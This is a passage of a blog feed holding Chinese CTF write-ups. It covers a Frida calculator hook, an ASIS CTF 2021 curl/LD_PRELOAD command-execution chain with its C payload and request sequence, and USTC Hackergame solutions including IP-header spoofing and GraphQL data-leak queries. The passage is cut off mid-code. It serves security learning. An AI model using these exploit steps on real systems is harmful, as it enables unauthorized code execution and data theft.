class="line">    <span class="keyword">var</span> newValR9 = oldValR9.<span class="title function_">writePointer</span>(<span class="title function_">ptr</span>(<span class="string">&quot;0x02&quot;</span>));</span><br><span class="line">    <span class="comment">// log(hexdump(oldValR9, &#123;</span></span><br><span class="line">    <span class="comment">// offset: 0,</span></span><br><span class="line">    <span class="comment">// length: 32,</span></span><br><span class="line">    <span class="comment">// header: true,</span></span><br><span class="line">    <span class="comment">// ansi: true</span></span><br><span class="line">    <span class="comment">// &#125;)); </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行命令后就会发现1+1&#x3D;3了，成果展示：</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/ezgif.com-gif-maker.gif" data-caption="ezgif.com-gif-maker"><img src="/2022/01/07/win32-Calculator/assets/ezgif.com-gif-maker.gif" alt="ezgif.com-gif-maker"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://frida.re/docs/frida-trace/">https://frida.re/docs/frida-trace/</a></p><p><a href="https://frida.re/docs/javascript-api/">https://frida.re/docs/javascript-api/</a></p><p><a href="https://github.com/win32calc/win32calc/releases">https://github.com/win32calc/win32calc/releases</a></p><p><a href="https://tianyu-code.top/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8%E4%BB%8B%E7%BB%8D/">https://tianyu-code.top/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8%E4%BB%8B%E7%BB%8D/</a></p><p><a href="https://zhuanlan.zhihu.com/p/53394807">https://zhuanlan.zhihu.com/p/53394807</a></p>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2021</title>
      <link href="/2021/12/30/ASIS-CTF-2021/"/>
      <url>/2021/12/30/ASIS-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="cuuurl"><a href="#cuuurl" class="headerlink" title="cuuurl"></a>cuuurl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Do you know how to pronounce &quot;curl&quot;?</span><br><span class="line">Download source code from here.</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): <span class="comment">#Poor coding skills :( can&#x27;t even get process output properly</span></span><br><span class="line">url = request.args.get(<span class="string">&#x27;url&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;http://localhost:8000/sayhi&quot;</span></span><br><span class="line">env = request.args.get(<span class="string">&#x27;env&#x27;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">outputFilename = request.args.get(<span class="string">&#x27;file&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;myregrets.txt&quot;</span></span><br><span class="line">outputFolder = <span class="string">f&quot;./outputs/<span class="subst">&#123;hashlib.md5(request.remote_addr.encode()).hexdigest()&#125;</span>&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(env):</span><br><span class="line">env = env.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">env = &#123;env[<span class="number">0</span>]:env[<span class="number">1</span>]&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">env = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;env: &quot;, env)</span></span><br><span class="line"></span><br><span class="line">master, slave = pty.openpty()</span><br><span class="line">os.set_blocking(master,<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">subprocess.run([<span class="string">&quot;/usr/bin/curl&quot;</span>,<span class="string">&quot;--url&quot;</span>,url],stdin=slave,stdout=slave,env=env,timeout=<span class="number">3</span>,)</span><br><span class="line">result = os.read(master,<span class="number">0x4000</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">os.close(slave)</span><br><span class="line">os.close(master)</span><br><span class="line">report = <span class="built_in">str</span>(e)</span><br><span class="line">report += <span class="string">&quot;\nurl: &quot;</span> + url + <span class="string">&quot;\nenv: &quot;</span> + <span class="built_in">str</span>(env) + <span class="string">&quot;\noutputFilename: &quot;</span> + outputFilename</span><br><span class="line"><span class="keyword">return</span> report,<span class="number">200</span>,&#123;<span class="string">&#x27;content-type&#x27;</span>:<span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">os.close(slave)</span><br><span class="line">os.close(master)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(outputFolder)):</span><br><span class="line">os.mkdir(outputFolder)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;/&quot;</span> <span class="keyword">in</span> outputFilename):</span><br><span class="line">outputFilename = secrets.token_urlsafe(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;outputFolder&#125;</span>/<span class="subst">&#123;outputFilename&#125;</span>&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">f&quot;/view?file=<span class="subst">&#123;outputFilename&#125;</span>&quot;</span>, code=<span class="number">302</span>)</span><br></pre></td></tr></table></figure><p>题目业务逻辑为：</p><ul><li>使用curl命令访问任意url并写入内容到指定目录的任意命名的文件下，同时可以配置环境变量env</li><li>通过&#x2F;view下传参文件名，访问文件内容</li></ul><p>一开始尝试file:&#x2F;&#x2F;协议读取flag，发现没有权限，但是给了一个binary文件可以读取flag</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 400 /flag.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 111 /readflag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +s /readflag</span></span><br></pre></td></tr></table></figure><p>因此思路是想办法执行根目录下readflag文件，得到flag</p><p>因为文件名可以任意写，且目录已知，通过curl官方文档 <a href="https://curl.se/docs/manpage.html#CURLHOME">curl - How To Use</a> 可以得知curl会首先寻找HOME环境变量目录下的.curlrc文件作为配置文件，在.curlrc文件中可以任意添加curl的参数。而env环境变量可以通过请求指定，确保能够访问到.curlrc文件。</p><p>所以可以写个.so文件然后通过env变量LD_PRELOAD执行.so文件，进而执行readfile。.curlrc文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--output /tmp/test.so</span><br></pre></td></tr></table></figure><p>test.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成.so文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o test.so test.c -nostartfiles</span><br></pre></td></tr></table></figure><p>最后调整GET请求参数就可以拿下flag了~</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=http://IP/curlrc.txt&amp;env=&amp;file=.curlrc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">GET /?url=http://IP/test.so&amp;env=HOME=/app/outputs/DIRECTORY&amp;file= HTTP/1.1 // 发送这个请求的时候服务器会返回报错，但是实际上已经执行成功了。调试发现具体报错为：[Errno 11] Resource temporarily unavailable，但并没有找到很好的解释为什么会报这个错误</span><br><span class="line">GET /?url=http://IP/&amp;env=LD_PRELOAD=/tmp/test.so&amp;file= HTTP/1.1</span><br><span class="line">GET /view?file=myregrets.txt HTTP/1.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASIS CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>USTC Hackgame 2021</title>
      <link href="/2021/11/04/USTC-Hackgame-2021/"/>
      <url>/2021/11/04/USTC-Hackgame-2021/</url>
      
        <content type="html"><![CDATA[<p>此为Thomason的个人WP，官方WP：<a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">USTC-Hackergame&#x2F;hackergame2021-writeups: 中国科学技术大学第八届信息安全大赛的官方与非官方题解 (github.com)</a>。个人战绩如下：</p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103144007966.png" data-caption="image-20211103144007966"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103144007966.png" alt="image-20211103144007966"></a></p><p>[TOC]</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开题目，是一个flag的日记，有显示时间，传入参数为<code>?page=</code>。通过简单调整参数发现表示的是秒数，从1970.1.1 8:00向后加。题目要求调到比赛时间，通过简单数学计算即可实现。</p><blockquote><p>  后来了解到这是Linux的时间戳，可以使用一些在线工具进行解答</p></blockquote><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103165715029.png" data-caption="image-20211103165715029"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103165715029.png" alt="image-20211103165715029"></a></p><h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p>题目给出一个带有十六进制数据的flag文件，明文flag被处理遮挡住了，但是16进制的数据并未被遮挡。定位 f 对应的 ASCII-Hex 编码为66，向后一一解码 Hex 即可。</p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/hex_editor.png" data-caption="hex_editor"><img src="/2021/11/04/USTC-Hackgame-2021/assets/hex_editor.png" alt="hex_editor"></a></p><h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><p>题目给出一个变调加速后的MP3文件，能够模糊听出“alpha beta”之类的单词，同时题目提示“考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。”猜测使用 <a href="https://en.wikipedia.org/wiki/NATO_phonetic_alphabet">NATO phonetic alphabet - Wikipedia</a> 读法朗读flag内容的字母。</p><p>这里笔者没有安装处理音频的软件，采用在线的一个浏览器插件解决。载入文件后直接调节速度即可，此插件自动变调减速音频。如果使用播放器进行低速播放还是会听到非常明显的小黄人音效，而且根本听不清，是因为播放器是不会对原本音频变调处理的，只做速度上的减速。</p><blockquote><p>  NATO phonetic alphabet 在众多战争类游戏中也有出现，比如战地五在夺取基地C时旁白播报：Take the objective Charlie. </p></blockquote><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171404165.png" data-caption="image-20211103171404165"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171404165.png" alt="image-20211103171404165"></a></p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171656102.png" data-caption="image-20211103171656102"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171656102.png" alt="image-20211103171656102"></a></p><h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p>猫咪问答，典型折磨题。题目答案都可以从互联网上找到，但是需要一些搜索技巧才能快速准确地找到答案。</p><ol><li>题目要求找到已经被并入中科大 Linux 用户协会（USTCLUG）的中科大信息安全俱乐部（SEC@USTC）的社团章程。题目给出了信息安全俱乐部以前的域名，想必是和这个有关。一开始尝试谷歌搜索几个关键字：“中科大信息安全俱乐部”，“章程”，“会员代表大会”，但都没有结果。域名无法打开，尝试寻找历史IP，也是无功而返。最后在好友的提醒下想到使用搜索引擎快照进行解决。<a href="https://web.archive.org/">Wayback Machine (archive.org)</a> 通过网址输入域名查询历史快照，在快照首页找到章程。</li><li>在 <a href="https://lug.ustc.edu.cn/wiki/intro/">中国科学技术大学 Linux 用户协会 - LUG @ USTC</a> 首页即可找到评为五星社团的次数。“并于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月、2020 年 9 月及 2021 年 9 月被评为中国科学技术大学五星级学生社团。” 题目条件限制为近五年，因此舍去2015年那次</li><li>找活动室门口牌子的字。既然题目明确表明不需要进入校园即可得到答案，依然搜索关键字：“中科大”，“西区”，“图书馆”。找到图片来源于 <a href="https://news.ustclug.org/2016/06/new-activity-room-in-west-library/">西区图书馆新活动室启用 - USTC LUG</a> 的历史活动照片，高清无码。</li><li>论文数据集查找。谷歌搜索论文，找到公开的源文件后稍微读一下论文内容即可知道答案。（或者直接根据图片数量猜测）</li><li>RFC举报机制。搜索相关关键字即可找到 <a href="https://www.rfc-editor.org/rfc/rfc8962.txt">官方文档</a> 中第六节有明确指出应该发向哪里。</li></ol><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>通过6斤的瓜和9斤的瓜称出20斤，小学生都知道是称不出来的。这题有点脑筋急转弯的感觉。一开始尝试浮点数绕过，科学计数法等等操作，结果都以失败告终。但是在尝试科学计数法的时候不小心数字整大了没清零，瓜的显示直接变成浮点数了。猜测可能有溢出，溢出成负数再慢慢加回来。经过尝试，如图，正好在这个条件下的负数可以直接使用6斤的瓜称够20斤。</p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173402531.png" data-caption="image-20211103173402531"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173402531.png" alt="image-20211103173402531"></a></p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173652547.png" data-caption="image-20211103173652547"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173652547.png" alt="image-20211103173652547"></a></p><h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><p>题目提示说文件是用来在终端生成五颜六色的flag。但是打开文件是一堆很奇怪的字符，有点像乱码。文件中找来找去找不到任何有关flag的线索，猜测是展示出flag并非直接在文中显示。搜索发现了一个<a href="https://blog.csdn.net/u014470361/article/details/81512330">CSDN</a>的相关介绍，但是并没有说明为什么这样就能显示彩色字体，按照文中的格式，把每个 <code>[</code> 前面都加上 <code>\033</code> 并且分行， <code>[XXm</code> 为表示的颜色字符的结尾标识部分，使用简单的shell脚本打印所有行即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for line in `cat transparent.txt`</span><br><span class="line">do</span><br><span class="line">    echo -e &quot;$line&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><blockquote><p>  后来查到终端显示彩色字符源于一个叫 <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape code</a> 的东西，终端把那些“奇怪”的字符序列解释为相应的指令，而不是普通字符编码。</p></blockquote><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103200311283.png" data-caption="image-20211103200311283"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103200311283.png" alt="image-20211103200311283"></a></p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201003986.png" data-caption="image-20211103201003986"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201003986.png" alt="image-20211103201003986"></a></p><h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><p>这是个非常有趣的题目，题目提示没有隐写等各种奇技淫巧，就是直接答题。观察图片，题目提示左上角是一个KFC（不说我都没看到）。直接搜索蓝色KFC相关资料，查到是一个在秦皇岛的一处景点，新奥海地世界。谷歌地图查看位置，发现在图上方有一个类似港口的地方，结合地图确定拍摄者大概位置为13<del>15层，以及拍摄时间约为下午的3</del>4点，朝向东南。然后可以通过KFC官方渠道找到门店电话（或者美团什么的），至于KFC旁边的三个字可以通过这个店在地图上标注的具体位置猜测，地图的位置是…秦皇岛市…海豚馆旁。猜测是海豚馆。但是本人是找到了在停车场拍照的正门照片（忘记保存），旁边确实是海豚馆。</p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/travel-photo.jpg" data-caption="img"><img src="/2021/11/04/USTC-Hackgame-2021/assets/travel-photo.jpg" alt="img"></a></p><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201850335.png" data-caption="image-20211103201850335"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201850335.png" alt="image-20211103201850335"></a></p><h2 id="FLAG-助力大红包"><a href="#FLAG-助力大红包" class="headerlink" title="FLAG 助力大红包"></a>FLAG 助力大红包</h2><p><del>拼多多砍一刀拿flag</del> （bushi。题目要求通过不同IP访问平台砍一刀，但是每个&#x2F;8地址只允许有一个IP参与砍。直接Python写脚本使用 <code>X-Forward-For</code> 伪造IP访问，当所有&#x2F;8地址访问完之后就可以拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;URL&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;.0.0.1&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;ip&#x27;</span>:ip&#125;</span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125; <span class="comment"># 本地Burp监听，自己测试是否访问成功</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">256</span>):</span><br><span class="line">ip = <span class="string">&#x27;.0.0.1&#x27;</span></span><br><span class="line">ip = <span class="built_in">str</span>(i) + ip</span><br><span class="line"><span class="built_in">print</span>(ip)</span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;ip&#x27;</span>:ip&#125;</span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">req = requests.post(url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Amnesia"><a href="#Amnesia" class="headerlink" title="Amnesia"></a>Amnesia</h2><p><strong>轻度失忆</strong></p><p>题目使编译后 ELF 文件的 <code>.data</code> 和 <code>.rodata</code> 段会被清零。ELF文件中代码部分会放到 <code>.text</code> 段中，只读数据，或者不变的字符会放到 <code>.rodata</code> 段中（注意，<code>print</code> 中直接写入的字符串也会放到 <code>.rodata</code> 段中），初始化的全局变量会放到 <code>.data</code> 段中。因此使用 <code>print</code> 函数是行不通的，换一种方法，比如 <code>putchar();</code> 答案就出来了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prints hello world</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;H&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;W&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><p>搜索GraphQL相关资料以及其基础的使用和语法。参考 <a href="https://threezh1.com/2020/05/24/GraphQL%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E5%8F%8A%E6%A1%88%E4%BE%8B/">Threezh1’Blog</a> 和 <a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">P神的PPT</a> 即可完成题目。GraphQL实际上的查询模式与其他数据库都是大同小异，都有显而易见的基本特征。利用内省查看所有可用字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后通过返回的数据直接利用payload完成攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;query&quot;:&quot;&#123; user(id:1) &#123; privateEmail &#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103205326244.png" data-caption="image-20211103205326244"><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103205326244.png" alt="image-20211103205326244"></a></p><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h2><p>参考：<a href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">RSA加密算法</a> <a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">模逆元</a> <a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a> <a href="https://blog.csdn.net/qq2539879928/article/details/106861935">Python实现密码学中的模逆运算</a> <a href="https://www.geeksforgeeks.org/compute-n-under-modulo-p/">Compute n! under modulo p - GeeksforGeeks</a></p><p><strong>求 $p$</strong></p><p>利用<a href="https://en.wikipedia.org/wiki/Wilson's_theorem">Wilson’s theorem - Wikipedia</a> 即可快速求出大数的的余数，尤其是当有阶乘存在的时候，参考代码： <a href="https://www.geeksforgeeks.org/compute-n-under-modulo-p/">Compute n! under modulo p - GeeksforGeeks</a>。<strong>注意别忘记最后是求出数字的下一个质数。</strong></p><p><strong>求 $q$</strong></p><p>$q$ 是顶级套娃，$q$ 也被加了一层RSA，但是对q加密的RSA使用了一个由多个质数相乘得到的 $N$ 。通过代码注释中给出的 <code>value[-1]</code> 便可以很容易得到整个列表数据。再通过欧拉函数作用于 $N$ 得到 $r$ ，再求 $e$ 关于 $r$ 的模逆元即可得到 $d$ 。此时就有公钥 $(N,e)$ 和私钥 $(N,d)$ 。即可进行解密操作。<strong>注意别忘记最后是求出数字的下一个质数。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 